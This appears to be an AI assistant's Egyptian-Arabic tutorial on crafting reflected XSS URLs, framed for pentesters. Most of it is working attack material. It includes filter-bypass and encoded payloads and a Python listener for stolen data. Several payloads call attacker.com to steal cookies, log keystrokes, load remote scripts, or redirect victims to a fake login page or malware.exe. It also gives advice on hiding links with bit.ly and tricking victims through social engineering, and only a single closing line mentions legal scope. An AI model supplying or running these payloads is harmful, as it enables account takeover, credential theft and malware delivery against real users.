تمام، هشرح القسم الخاص بـ **Crafting Malicious URLs to Execute Scripts** في سياق **Reflected XSS** بعمق، مع التركيز على الجانب العملي من ناحية الأوامر والأكواد، وهضيف خلاصة بالعامية المصرية بعد كل جزء. في النهاية، هقدم كل السيناريوهات الممكنة لاستغلال الثغرة دي كـ **Pentester**. هنبدأ!

---

### **1. فهم Crafting Malicious URLs to Execute Scripts**
الجزء ده بيتكلم عن إزاي المهاجم (أو الـ Pentester) بيصمم رابط (URL) فيه كود خبيث (Payload) عشان يخلّي الموقع ينفذ سكربت في متصفح الضحية. الفكرة إنك بتستغل نقطة ضعف في الموقع اللي بياخد بيانات من الـ URL (زي الباراميترات) ويعرضها في الصفحة من غير ما ينظفها (**Sanitize**) أو يفحصها (**Validate**). لما الضحية تفتح الرابط، السكربت بيشتغل في المتصفح بتاعها.

#### **آلية العمل:**
- الموقع بيسمح بإدخال بيانات عبر الـ URL، زي:
  ```
  example.com/search?query=test
  ```
- المهاجم بيحط كود خبيث في الباراميتر (`query` في المثال ده).
- لما المستخدم يفتح الرابط، الموقع بيعرض الكود الخبيث كجزء من الصفحة.
- المتصفح بينفذ الكود لأنه بيظهر كأنه جزء من HTML أو JavaScript الصفحة.

#### **لماذا بيحصل؟**
لأن الموقع مش بيفحص المدخلات أو بيعتمد على عرض البيانات زي ما هي من غير تصفية. ده بيخلّي أي سكربت في الـ URL يتنفذ مباشرة.

---

**خلاصة بالعامية:**
زي ما تكون بتكتب رسالة فيها سم، وبتبعتها للموقع. الموقع بيفتح الرسالة ويحطها في الصفحة من غير ما يشوف فيها إيه، فالسم (السكربت) يشتغل لما حد يفتح الرابط.

---

### **2. الجانب العملي: إزاي تصمم Malicious URLs وتستغلها؟**

#### **الخطوة 1: تحديد الباراميترات المستهدفة**
كـ **Pentester**، أول حاجة هتعملها هي إنك تدور على باراميترات في الـ URL ممكن تتحكم فيها. دي أمثلة على باراميترات شائعة:
- `?search=` أو `?query=` (حقول البحث).
- `?id=` أو `?page=` (معرفات الصفحات).
- `?name=` أو `?message=` (حقول الإدخال).

##### **اختبار يدوي:**
1. افتح صفحة فيها باراميتر URL، زي:
   ```
   example.com/search?query=test
   ```
2. جرب تحط سكربت بسيط في الباراميتر:
   ```
   example.com/search?query=<script>alert('XSS')</script>
   ```
3. لو ظهرت نافذة Alert فيها كلمة "XSS"، يبقى الباراميتر ضعيف وممكن تستغله.

##### **استخدام أدوات:**
- **Burp Suite**:
  1. اضبط Burp Suite على الـ Proxy عشان يلتقط الطلبات.
  2. افتح الرابط في المتصفح، وادخل كلمة زي `test` في الباراميتر.
  3. في Burp Suite، ابعت الطلب للـ **Repeater**.
  4. استبدل `test` بـ Payload زي:
     ```html
     <script>alert('XSS')</script>
     ```
  5. اضغط "Send"، وشوف الـ Response. لو الكود اتعرض زي ما هو، يبقى فيه ثغرة.

- **XSStrike**:
  1. نزّل XSStrike:
     ```
     git clone https://github.com/s0md3v/XSStrike.git
     ```
  2. شغّل الأداة على الرابط:
     ```
     python3 xsstrike.py -u "example.com/search?query=test"
     ```
  3. الأداة هتختبر الباراميتر بـ Payloads مختلفة وتعرفك لو فيه ثغرة.

---

**خلاصة بالعامية:**
الخطوة دي زي ما تكون بتدور على الباب الضعيف في البيت (الباراميتر). بتخبّط عليه بحاجة بسيطة (زي Alert) عشان تشوف لو الباب هيفتح. لو فتح، يبقى جاهز تبعت السكربت الخبيث.

---

#### **الخطوة 2: تصميم Malicious URLs بـ Payloads**
لما تعرف إن الباراميتر ضعيف، تبدأ تصمم رابط فيه **Payload** يناسب الهدف. هنا أمثلة على Payloads وإزاي تضيفها للـ URL:

##### **1. Payload بسيط للاختبار:**
```html
<script>alert(document.cookie)</script>
```
- حطه في الـ URL:
  ```
  example.com/search?query=<script>alert(document.cookie)</script>
  ```
- لو اشتغل، يبقى تقدر تشوف الكوكيز وتستغلها.

##### **2. Payload لسرقة الكوكيز:**
```html
<script>new Image().src='attacker.com/log?cookie='+document.cookie;</script>
```
- الرابط:
  ```
  example.com/search?query=<script>new Image().src='attacker.com/log?cookie='+document.cookie;</script>
  ```
- ده بيبعت الكوكيز لسيرفرك الخبيث.

##### **3. Payload لتحميل سكربت خارجي:**
```html
<script src="attacker.com/malicious.js"></script>
```
- الرابط:
  ```
  example.com/search?query=<script src="attacker.com/malicious.js"></script>
  ```
- ده بيحمل سكربت من موقعك يقدر يعمل حاجات زي تسجيل ضربات المفاتيح.

##### **4. Payload لتجاوز الفلاتر:**
لو الموقع بيمنع `<script>`، جرب أكواد تانية:
```html
<img src=x onerror=alert('XSS')>
```
- الرابط:
  ```
  example.com/search?query=<img src=x onerror=alert('XSS')>
  ```

أو:
```html
<svg onload=alert('XSS')>
```
- الرابط:
  ```
  example.com/search?query=<svg onload=alert('XSS')>
  ```

##### **5. Payload مشفر (Encoded):**
لو الموقع بيعمل Encode لبعض الحروف، استخدم URL Encoding عشان تخفي الكود:
- Payload عادي:
  ```html
  <script>alert('XSS')</script>
  ```
- Payload بعد الـ Encoding:
  ```
  %3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
  ```
- الرابط:
  ```
  example.com/search?query=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
  ```

##### **6. Payload مختصر للـ URLs الطويلة:**
لو الـ URL محدود بالطول، استخدم Payload صغير:
```html
<svg/onload=alert(1)>
```
- الرابط:
  ```
  example.com/search?query=<svg/onload=alert(1)>
  ```

---

**خلاصة بالعامية:**
تصميم الرابط زي ما تكون بتحضّر قنبلة. لازم تختار الـ Payload المناسب (زي Alert بسيط أو سكربت يسرق الكوكيز)، ولو الموقع حاطط حماية، تستخدم حاجات ذكية زي الـ Encoding أو أكواد من غير `<script>`.

---

#### **الخطوة 3: إعداد سيرفر لاستقبال البيانات**
عشان تستغل الثغرة (زي سرقة الكوكيز أو تسجيل بيانات)، لازم يكون عندك سيرفر جاهز. هنا طريقة عملية:

1. **إعداد سيرفر بسيط بـ Python:**
   - اكتب سكربت Python:
     ```python
     from http.server import HTTPServer, BaseHTTPRequestHandler

     class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         def do_GET(self):
             self.send_response(200)
             self.end_headers()
             print(f"Received: {self.path}")
             self.wfile.write(b"Data received!")

     httpd = HTTPServer(('0.0.0.0', 80), SimpleHTTPRequestHandler)
     httpd.serve_forever()
     ```
   - شغّل السكربت:
     ```
     python3 server.py
     ```
   - السيرفر هيسجّل أي بيانات بتيجي (زي الكوكيز).

2. **استخدام Payload لإرسال البيانات:**
   - Payload:
     ```html
     <script>new Image().src='attacker.com/log?cookie='+document.cookie;</script>
     ```
   - الرابط:
     ```
     example.com/search?query=<script>new Image().src='attacker.com/log?cookie='+document.cookie;</script>
     ```

3. **اختبار الرابط:**
   - ابعت الرابط لنفسك أو لـ Test Environment.
   - لو الضحية فتحت الرابط، هتشوف الكوكيز أو البيانات في السيرفر بتاعك.

---

**خلاصة بالعامية:**
السيرفر ده زي المحفظة اللي بتحط فيها الغنيمة. لما الضحية تفتح الرابط، السكربت هيبعتلك البيانات (زي الكوكيز) على السيرفر، وانت كده مسكت المفتاح.

---

#### **الخطوة 4: التعامل مع القيود**
المواقع أحيانًا بتحط قيود عشان تمنع XSS. إزاي تتخطاها؟
1. **فلاتر `<script>`**:
   - استخدم أحداث HTML زي:
     ```html
     <img src=x onerror=alert('XSS')>
     ```
   - أو:
     ```html
     <input onfocus=alert('XSS') autofocus>
     ```

2. **حد طول الـ URL**:
   - استخدم Payloads قصيرة:
     ```html
     <svg/onload=alert(1)>
     ```
   - أو ارفع السكربت على سيرفرك واستخدم:
     ```html
     <script src="attacker.com/x.js"></script>
     ```

3. **Content Security Policy (CSP)**:
   - لو الموقع بيستخدم CSP، حاول تبعت الكود في سياقات مش ممنوعة، زي JSONP أو Data URLs.
   - مثال:
     ```html
     <img src="data:image/svg+xml,<svg onload=alert('XSS')>">
     ```

4. **URL Encoding أو Double Encoding**:
   - لو الموقع بيفحص الكود، استخدم Encoding:
     - `<` → `%3C`
     - `>` → `%3E`
   - أو Double Encoding لو الفلتر ضعيف:
     - `<` → `%253C`

---

**خلاصة بالعامية:**
الموقع زي واحد حاطط قفل على الباب، بس القفل ضعيف. لو منع `<script>`، جرب حاجات تانية زي `<img>` أو `<svg>`. لو الرابط طويل، استخدم كود صغير أو سكربت من برا. لازم تكون ذكي وتخدّع الحماية.

---

### **3. السيناريوهات الممكنة لاستغلال Malicious URLs**
كـ **Pentester**، لازم تعرف كل الطرق اللي ممكن تستغل بيها الـ Malicious URLs. هنا السيناريوهات:

1. **سرقة الكوكيز (Session Hijacking):**
   - **الوصف**: تبعت رابط يسرق الكوكيز بتاعة الضحية وتستخدمها عشان تدخل على حسابها.
   - **Payload**:
     ```html
     <script>new Image().src='attacker.com/log?cookie='+document.cookie;</script>
     ```
   - **الرابط**:
     ```
     example.com/search?query=<script>new Image().src='attacker.com/log?cookie='+document.cookie;</script>
     ```
   - **الخطوات**:
     1. ابعت الرابط للضحية (إيميل، رسالة، Social Engineering).
     2. لما الضحية تفتح الرابط، الكوكيز هتبعت لسيرفرك.
     3. استخدم الكوكيز في Burp Suite عشان تعمل Session Hijacking.

2. **Phishing (تزييف صفحات تسجيل الدخول):**
   - **الوصف**: تعمل Redirect لصفحة تسجيل دخول مزيفة عشان تسرق بيانات الضحية.
   - **Payload**:
     ```html
     <script>window.location='attacker.com/fake-login';</script>
     ```
   - **الرابط**:
     ```
     example.com/search?query=<script>window.location='attacker.com/fake-login';</script>
     ```
   - **الخطوات**:
     1. صمم صفحة تسجيل دخول شبه الموقع الأصلي.
     2. لما الضحية تفتح الرابط، هتروح للصفحة المزيفة.
     3. سجّل اليوزر والباسورد اللي بتدخلهم.

3. **تنفيذ أوامر في سياق المستخدم:**
   - **الوصف**: تستخدم الرابط عشان تنفذ أوامر زي تغيير كلمة السر أو إرسال رسايل.
   - **Payload**:
     ```html
     <script>
       var xhr = new XMLHttpRequest();
       xhr.open('POST', 'example.com/change-password', true);
       xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
       xhr.send('new_password=attacker123');
     </script>
     ```
   - **الرابط**:
     ```
     example.com/search?query=<script>var xhr=new XMLHttpRequest();xhr.open('POST','example.com/change-password',true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('new_password=attacker123');</script>
     ```
   - **الخطوات**:
     1. ادرس API الموقع عشان تعرف الأوامر.
     2. صمم الرابط عشان ينفذ الأمر لما الضحية تفتحه.

4. **تسجيل ضربات المفاتيح (Keylogging):**
   - **الوصف**: تسجل كل اللي الضحية بتكتبه لما تفتح الرابط.
   - **Payload**:
     ```html
     <script>
       document.onkeypress = function(e) {
         new Image().src='attacker.com/log?key=' + e.key;
       };
     </script>
     ```
   - **الرابط**:
     ```
     example.com/search?query=<script>document.onkeypress=function(e){new Image().src='attacker.com/log?key='+e.key;}</script>
     ```
   - **الخطوات**:
     1. حط الرابط في مكان الضحية تفتحه.
     2. كل ما تكتب حاجة، المفاتيح هتبعت لسيرفرك.

5. **تحميل برمجيات خبيثة:**
   - **الوصف**: تخلّي المتصفح يحمل ملف خبيث لما الضحية تفتح الرابط.
   - **Payload**:
     ```html
     <script>window.location='attacker.com/malware.exe';</script>
     ```
   - **الرابط**:
     ```
     example.com/search?query=<script>window.location='attacker.com/malware.exe';</script>
     ```
   - **الخطوات**:
     1. ارفع ملف خبيث على سيرفرك.
     2. صمم الرابط عشان يحمل الملف تلقائيًا.

6. **إعادة توجيه لموقع خبيث:**
   - **الوصف**: ترمي الضحية على موقع فيه هجمات تانية.
   - **Payload**:
     ```html
     <script>window.location='malicious-site.com';</script>
     ```
   - **الرابط**:
     ```
     example.com/search?query=<script>window.location='malicious-site.com';</script>
     ```
   - **الخطوات**:
     1. اختار موقع خبيث.
     2. صمم الرابط عشان يعمل Redirect.

7. **استغلال ميزات الموقع:**
   - **الوصف**: تستخدم الرابط عشان تنفذ ميزات زي إرسال رسايل أو تعديل بيانات.
   - **Payload**:
     ```html
     <script>
       fetch('example.com/send-message', {
         method: 'POST',
         body: 'message=You are hacked!'
       });
     </script>
     ```
   - **الرابط**:
     ```
     example.com/search?query=<script>fetch('example.com/send-message',{method:'POST',body:'message=You are hacked!'});</script>
     ```
   - **الخطوات**:
     1. ادرس ميزات الموقع.
     2. صمم الرابط عشان ينفذ الأوامر دي.

---

**خلاصة بالعامية للسيناريوهات:**
كل رابط زي خطة هجوم مختلفة. ممكن تسرق الكوكيز وتتحكم في الحساب، أو تخلّي الضحية تدخل بياناتها في صفحة مزيفة، أو حتى تخلّيها تحمل فيروس. المهم تفهم الموقع شغال إزاي وتصمم الرابط اللي يضرب الهدف بالظبط.

---

### **4. نصايح للـ Pentester**
1. **اختبر في بيئة آمنة**: استخدم موقعك الخاص أو بيئة اختبار عشان تتجنب المشاكل القانونية.
2. **جرب Payloads متنوعة**: المواقع بتستخدم فلاتر مختلفة، فجرب `<img>`، `<svg>`، أو أكواد مشفرة.
3. **اختصر الـ URLs**: استخدم خدمات تقصير الروابط (زي bit.ly) عشان تخفي الرابط الخبيث.
4. **استخدم Social Engineering**: عشان الضحية تفتح الرابط، صمم إيميل أو رسالة مقنعة.
5. **سجّل كل خطوة**: وانت بتختبر، دوّن الـ Payloads والنتايج عشان تقريرك يكون دقيق.
6. **افهم سياق الموقع**: شوف الباراميتر بيتعامل معاه إزاي (في HTML، Attributes، أو JavaScript).

---

**خلاصة نهائية بالعامية:**
Crafting Malicious URLs هو السحر الأسود في الـ Pentesting. لو عرفت تصمم رابط فيه Payload ذكي، تقدر تسيطر على المتصفح بتاع الضحية. سواء عايز تسرق الكوكيز، تعمل Phishing، أو تخلّي الموقع ينفذ أوامر، الرابط هو مفتاحك. بس لازم تكون مبدع، تستخدم أدوات زي Burp Suite وXSStrike، وتفكّر زي المهاجم. واهم حاجة، خلّي اختباراتك قانونية وفي نطاق الـ Scope!

لو عايز توضيح زيادة أو أمثلة تانية، قولي! 😎